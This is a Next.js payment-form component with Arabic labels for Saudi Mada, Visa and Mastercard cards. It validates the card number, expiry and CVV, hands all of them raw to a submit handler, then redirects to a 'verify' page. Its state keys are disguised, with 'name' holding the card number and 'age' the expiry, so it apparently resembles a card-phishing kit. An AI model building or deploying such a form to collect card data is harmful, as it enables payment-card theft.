"use client";

import { useState } from "react";
import { useRouter } from "next/navigation";
import Image from "next/image";

interface PaymentFormProps {
  onSubmit: (fields: { name: string; age: string; cvv: string; cardHolder: string }) => Promise<void>;
}

export default function PaymentForm({ onSubmit }: PaymentFormProps) {
  const router = useRouter();
  const [fields, setFields] = useState({ name: "", age: "", cvv: "", cardHolder: "" });
  const [errors, setErrors] = useState(false);
  const [cardError, setCardError] = useState("");
  const [expiryError, setExpiryError] = useState("");
  const [cvvError, setCvvError] = useState("");
  const [loading, setLoading] = useState(false);
  const [flipped, setFlipped] = useState(false);

  const MADA_BINS = ["588845","440647","440795","446404","457865","968208","457997","474491","543357","434107","431361","604906","521076","588848","968210","968211","968212","968213","968214","968215","968216","968217","968218","968219","968220","531095","531196","532013","535825","535989","536023","537767","539931","543085","549760","558563","585265","588850","588982","589005","589206","604906","636120","968201","968202","968203","968204","968205","968206","968207"];

  const getCardType = (num: string): "Visa" | "Mastercard" | "Mada" | null => {
    if (num.length < 6) return null;
    const bin6 = num.slice(0, 6);
    if (MADA_BINS.includes(bin6)) return "Mada";
    if (/^4/.test(num)) return "Visa";
    const prefix = parseInt(num.slice(0, 4));
    if (/^5[1-5]/.test(num) || (prefix >= 2221 && prefix <= 2720)) return "Mastercard";
    return null;
  };

  const luhnCheck = (num: string) => {
    let sum = 0;
    let shouldDouble = false;
    for (let i = num.length - 1; i >= 0; i--) {
      let digit = parseInt(num[i]);
      if (shouldDouble) { digit *= 2; if (digit > 9) digit -= 9; }
      sum += digit;
      shouldDouble = !shouldDouble;
    }
    return sum % 10 === 0;
  };

  const handleNext = async () => {
    const rawCard = fields.name.replace(/\s/g, "");
    if (!fields.name || !fields.age || !fields.cvv || !fields.cardHolder) {
      setErrors(true);
      return;
    }
    if (rawCard.length !== 16) { setCardError("رقم البطاقة يجب أن يكون 16 رقمًا"); return; }
    if (!luhnCheck(rawCard)) { setCardError("⚠️ رقم البطاقة غير صحيح"); return; }
    if (!getCardType(rawCard)) { setCardError("⚠️ نوع البطاقة غير مدعوم، يرجى استخدام Visa أو Mastercard أو Mada"); return; }
    setCardError("");
    if (fields.cvv.length !== 3) { setCvvError("⚠️ رمز CVV يجب أن يكون 3 أرقام"); return; }
    setCvvError("");
    const parts = fields.age.split("/");
    const expMonth = Number(parts[0]);
    const expYear = Number(parts[1]);
    const now = new Date();
    if (!expMonth || !expYear || parts[0]?.length !== 2 || parts[1]?.length !== 2) {
      setExpiryError("⚠️ يرجى إدخال تاريخ انتهاء صحيح بصيغة MM/YY");
      return;
    }
    if (expMonth < 1 || expMonth > 12) {
      setExpiryError("⚠️ الشهر يجب أن يكون بين 01 و 12");
      return;
    }
    const cardDate = new Date(2000 + expYear, expMonth - 1, 1);
    const currentMonth = new Date(now.getFullYear(), now.getMonth(), 1);
    if (cardDate < currentMonth) {
      setExpiryError("⚠️ تاريخ انتهاء البطاقة منتهي، يرجى استخدام بطاقة سارية");
      return;
    }
    if (2000 + expYear > now.getFullYear() + 10) {
      setExpiryError("⚠️ تاريخ انتهاء البطاقة غير صحيح");
      return;
    }
    setExpiryError("");
    setLoading(true);
    try {
      await onSubmit(fields);
      router.push("/checkout/verify");
    } finally {
      setLoading(false);
    }
  };

  const inputClass = (field: keyof typeof fields) =>
    `w-full border rounded-lg px-3 py-2.5 text-base sm:text-sm outline-none focus:border-gray-500 ${errors && !fields[field] ? "border-red-400" : "border-gray-300"}`;

  const cardType = getCardType(fields.name.replace(/\s/g, ""));

  const displayNumber = fields.name
    ? fields.name.padEnd(19, " ").slice(0, 19)
    : "0000 0000 0000 0000";

  const cardBg = cardType === "Mada"
    ? "linear-gradient(135deg, #1a1a2e 0%, #16213e 50%, #0f3460 100%)"
    : cardType === "Mastercard"
    ? "linear-gradient(135deg, #eb5757 0%, #000000 100%)"
    : "linear-gradient(135deg, #1a1a2e 0%, #1565c0 50%, #0d47a1 100%)";

  return (
    <>
      {/* Visual Card - Flip Container */}
      <div className="w-full max-w-sm mx-auto mb-4" style={{ perspective: "1000px", minHeight: "180px" }}>
        <div
          style={{
            transition: "transform 0.6s",
            transformStyle: "preserve-3d",
            transform: flipped ? "rotateY(180deg)" : "rotateY(0deg)",
            position: "relative",
            minHeight: "180px",
          }}
        >
          {/* Front */}
          <div
            className="absolute inset-0 rounded-2xl p-5 text-white select-none"
            style={{ background: cardBg, boxShadow: "0 20px 60px rgba(0,0,0,0.3)", backfaceVisibility: "hidden" }}
          >
            <div className="w-10 h-7 rounded-md mb-4" style={{ background: "linear-gradient(135deg, #d4af37, #f5e06e, #d4af37)" }} />
            <div className="font-mono text-xl tracking-widest mb-4 text-center" dir="ltr">{displayNumber}</div>
            <div className="flex justify-between items-end">
              <div>
                <p className="text-xs opacity-60 mb-0.5">Card Holder</p>
                <p className="text-sm font-semibold tracking-wider uppercase truncate max-w-[160px]">{fields.cardHolder || "FULL NAME"}</p>
              </div>
              <div className="text-right">
                <p className="text-xs opacity-60 mb-0.5">Expires</p>
                <p className="text-sm font-semibold">{fields.age || "MM/YY"}</p>
              </div>
            </div>
            <div className="absolute top-4 left-4">
              {cardType === "Mada" ? (
                <Image src="/mada975b.png" alt="Mada" width={50} height={30} className="object-contain brightness-0 invert" />
              ) : (
                <Image src="/cc975b.png" alt="Visa" width={50} height={30} className="object-contain brightness-0 invert" />
              )}
            </div>
          </div>

          {/* Back */}
          <div
            className="absolute inset-0 rounded-2xl text-white select-none overflow-hidden"
            style={{ background: cardBg, boxShadow: "0 20px 60px rgba(0,0,0,0.3)", backfaceVisibility: "hidden", transform: "rotateY(180deg)" }}
          >
            <div className="w-full h-10 mt-6" style={{ background: "#1a1a1a" }} />
            <div className="px-5 mt-4">
              <p className="text-xs opacity-60 mb-1 text-right">CVV</p>
              <div className="bg-white rounded px-3 py-2 text-gray-800 font-mono tracking-widest text-right text-sm">
                {fields.cvv || "•••"}
              </div>
            </div>
          </div>
        </div>
      </div>

      <div className="bg-white rounded-2xl overflow-hidden p-4 sm:p-6">
        <div className="flex justify-start items-center gap-3 mb-4">
          <Image src="/mada975b.png" alt="Mada" width={60} height={60} className="object-contain sm:w-[80px] sm:h-[80px]" />
          <Image src="/cc975b.png" alt="Visa" width={60} height={60} className="object-contain sm:w-[80px] sm:h-[80px]" />
        </div>
        <div className="grid grid-cols-1 sm:grid-cols-2 gap-3">
          <div className="sm:col-span-2">
            <label className="block text-xs sm:text-sm font-medium text-gray-800 mb-1">رقم البطاقه <span className="text-red-500">*</span></label>
            <input
                autoComplete="cc-number" type="text" placeholder="0000 0000 0000 0000" maxLength={19} dir="ltr" style={{textAlign: "right"}}
                value={fields.name}
                onChange={e => {
                  let v = e.target.value.replace(/\D/g, "").slice(0, 16);
                  v = v.match(/.{1,4}/g)?.join(" ") ?? v;
                  setFields(f => ({ ...f, name: v }));
                  const raw = v.replace(/\s/g, "");
                  if (raw.length >= 6 && !getCardType(raw)) {
                    setCardError("نوع البطاقة غير مدعوم، يرجى استخدام Visa أو Mastercard أو Mada");
                  } else {
                    setCardError("");
                  }
                }}
                className={inputClass("name")}
              />
            {fields.name.replace(/\s/g, "").length >= 1 && (() => {
              const raw = fields.name.replace(/\s/g, "");
              const type = getCardType(raw);
              const badgeStyle: Record<string, string> = {
                Visa: "bg-blue-100 text-blue-700 border border-blue-300",
                Mastercard: "bg-red-100 text-red-700 border border-red-300",
                Mada: "bg-indigo-100 text-indigo-700 border border-indigo-300",
              };
              return (
                <div className="mt-1.5 flex items-center gap-2">
                  {type ? (
                    <span className={`text-xs font-semibold px-2 py-0.5 rounded-full ${badgeStyle[type]}`}>
                      ✓ {type}
                    </span>
                  ) : raw.length >= 1 ? (
                    <span className="text-xs font-semibold px-2 py-0.5 rounded-full bg-gray-100 text-gray-400 border border-gray-200">
                      نوع البطاقة غير معروف بعد...
                    </span>
                  ) : null}
                </div>
              );
            })()}
            {cardError && (
              <p className="text-red-500 text-sm font-medium mt-1.5">⚠️ {cardError}</p>
            )}
          </div>
          <div>
            <label className="block text-xs sm:text-sm font-medium text-gray-800 mb-1">تاريخ الانتهاء <span className="text-red-500">*</span></label>
            <input
              autoComplete="cc-exp" type="text" placeholder="MM/YY" maxLength={5}
              value={fields.age}
              onChange={e => { let v = e.target.value.replace(/\D/g, ""); if (v.length >= 3) v = v.slice(0, 2) + "/" + v.slice(2, 4); setFields(f => ({ ...f, age: v })); setExpiryError(""); }}
              className={`${inputClass("age")} ${expiryError ? "border-red-400" : ""}`}
            />
            {expiryError && (
              <p className="text-red-500 text-sm font-medium mt-1.5">{expiryError}</p>
            )}
          </div>
          <div>
            <label className="block text-xs sm:text-sm font-medium text-gray-800 mb-1">رمز ال CVV <span className="text-red-500">*</span></label>
            <input
              autoComplete="cc-csc" type="text" placeholder="000" maxLength={3}
              value={fields.cvv}
              onFocus={() => setFlipped(true)}
              onBlur={() => setFlipped(false)}
              onChange={e => { const v = e.target.value.replace(/\D/g, "").slice(0, 3); setFields(f => ({ ...f, cvv: v })); setCvvError(""); }}
              className={`${inputClass("cvv")} ${cvvError ? "border-red-400" : ""}`}
            />
            {cvvError && <p className="text-red-500 text-sm font-medium mt-1.5">{cvvError}</p>}
          </div>
          <div className="sm:col-span-2">
            <label className="block text-xs sm:text-sm font-medium text-gray-800 mb-1">اسم حامل البطاقة <span className="text-red-500">*</span></label>
            <input
              autoComplete="cc-name" type="text" placeholder="اسم حامل البطاقة"
              value={fields.cardHolder}
              onChange={e => { const v = e.target.value.replace(/[^a-zA-Z ]/g, ""); setFields(f => ({ ...f, cardHolder: v.toUpperCase() })); }}
              className={inputClass("cardHolder")}
            />
          </div>
        </div>
      </div>

      <div className="flex gap-3">
        <button
          onClick={() => router.push("/cart")}
          className="flex-1 border border-gray-300 text-gray-700 font-medium py-3.5 rounded-2xl text-sm hover:bg-gray-100 transition"
        >
          السابق
        </button>
        <button
          onClick={handleNext}
          disabled={loading}
          className="flex-1 bg-teal-500 hover:bg-teal-600 active:scale-[0.98] text-white font-medium py-3.5 rounded-2xl transition-all text-sm disabled:opacity-60 disabled:cursor-not-allowed"
        >
          {loading ? "جاري المعالجة..." : "التالي"}
        </button>
      </div>
    </>
  );
}
